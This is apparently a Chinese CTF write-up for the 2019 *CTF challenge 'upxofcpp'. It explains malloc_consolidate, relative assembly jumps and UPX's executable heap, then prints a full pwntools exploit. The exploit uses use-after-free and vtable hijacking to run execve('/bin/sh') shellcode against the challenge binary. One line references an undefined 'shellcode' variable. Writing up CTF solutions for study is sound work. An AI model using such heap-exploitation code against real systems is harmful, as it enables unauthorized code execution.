---
title: Starctf2019_upxofcpp
date: 2019-05-03 22:29:58
tags:
---
非常有趣构思巧妙的一题..可能我tcl都没见过所以觉得巧妙..
<!--more-->
# start
比赛的时候没有做出来...
感觉这题好多不知道的东西...
# asm(jmp .+_n)
发现汇编还可以这样写...
学到了...可以`jmp .+0x10`表示跳当前地址+0x10.. 
可能是2字节或者5字节主要看n和符号例如`+0x81`和`-0x7e`
用到时候直接ipython试试
汇编没学好...感觉这个超灵活.shellcode可以不连续了...还可以往回跳..

# malloc_consolidate
简单了解了一下..这几天准备出题比较忙之后填坑...[seebug][1]
* 何时会触发 malloc_consolidate(仅对 _int_malloc 函数而言):small bins 尚未初始化&需要 size 大于 small bins
* malloc_consolidate 如何进行合并:遍历 Fastbins 中的 chunk, 设置每个 chunk 的空闲标志位为 0, 并合并相邻的空闲 chunk, 之后把该 chunk 存放到 unsorted bin 中.Fastbins 是单向链表, 可以通过  fastbin->fd 遍历 Fastbins.

这个函数简单来说就是整理`fastbin`能合并的合并放入`unsortedbin`
还没去啃源码但是发现在`free`一个`chunk`放入`top`chunk的时候会触发.

本来感觉也没啥..后来发现是`too young too navie ...` 

我做不出来一个是不知道上面的`asm(jmp .+_n)`还有一个点是..正常的放入`fast bin`+`add`操作无法使得`fd`可控但是在链中...（想了挺久的就是没办法）

`malloc_consolidate`的好处是往`fd&bk`上填了`main_arena+88`..
而`main_arena+0x8`是`last_remain`..其最开始的8字节属于刚被`malloc`的`chunk`所以可控
而且`main_arena+0x10`是`unsorted bin[0]`其最开始的8字节可控....
这就很巧妙地和上面的`asm(jmp .+_n)`结合起来...恰好可以一起完成exp..


# UPX
题目中是简单的 `./upx -d  binary`就可以脱壳放入`ida`看清逻辑
听主办方讲题的时候说这个版本的upx `heap`可执行虽然调的时候发现但是..做题一直拿着脱壳后的`binary`忽略了`heap`可执行感觉自己差太远...

# 思路
* uaf + vtable call to run shellcode

(思路.exp很巧妙....)

# exp
```python
from pwn import *
def cmd(c):
	p.sendlineafter("ice:",str(c))
def add(idx,size,data="-1"):
	cmd(1)
	p.sendlineafter("dex:",str(idx))
	p.sendlineafter("ize:",str(size))
	p.sendlineafter("stop:",data)
def free(idx):
	cmd(2)
	p.sendlineafter("dex:",str(idx))
def show(idx):
	cmd(4)
	p.sendlineafter("dex:",str(idx))
context.log_level='debug'
p=process('./upxofcpp_raw')
context.arch='amd64'
sh=asm(shellcode)
data=u32(sh+'\x00'*2)
add(0,0x68/4)
add(1,0x68/4)
add(2,0x100/4)
free(0)
free(1)
free(2)
raw='''
xor rsi,rsi
xor rdx,rdx
xor rax,rax
mov al,0x3b
mov rdi,0x0068732f6e69622f
nop
push rdi
mov rdi,rsp
syscall
'''
#>0x80000000will crash so nop...
raw=asm(raw).ljust(0x30,'\x00')+asm('jmp .-0x30')
s=''
for x in range(0,0x38,4):
	s+=str(u32(raw[x:x+4].ljust(4,'\x00')))+"\n"
add(3,0x38/4,s)
#gdb.attach(p,'b *0x000555555555723')
free(1)
p.interactive()
```




[1]:https://paper.seebug.org/255/#5-last_remainder